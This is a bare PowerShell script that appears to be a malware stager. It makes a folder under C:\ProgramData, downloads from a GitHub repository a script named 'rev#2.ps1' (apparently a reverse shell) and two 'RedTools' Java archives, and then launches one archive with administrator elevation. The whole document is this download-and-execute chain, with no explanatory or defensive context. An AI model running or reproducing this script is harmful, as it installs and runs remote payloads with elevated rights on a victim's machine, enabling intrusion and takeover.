mkdir C:\ProgramData\zDATAxD
cd C:\ProgramData\zDATAxD
$source = 'https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/rev%232.ps1'
$destination = 'C:\ProgramData\zDATAxD\rev%232.ps1'
Invoke-WebRequest -Uri $source -OutFile $destination
$source = 'https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/RedTools.jar'
$destination = 'C:\ProgramData\zDATAxD\RedTools.jar'
Invoke-WebRequest -Uri $source -OutFile $destination
$source = 'https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/RedTools8085.jar'
$destination = 'C:\ProgramData\zDATAxD\RedTools8085.jar'
Invoke-WebRequest -Uri $source -OutFile $destination
Start-Process powershell -verb runas -ArgumentList C:\ProgramData\zDATAxD\RedTools.jar
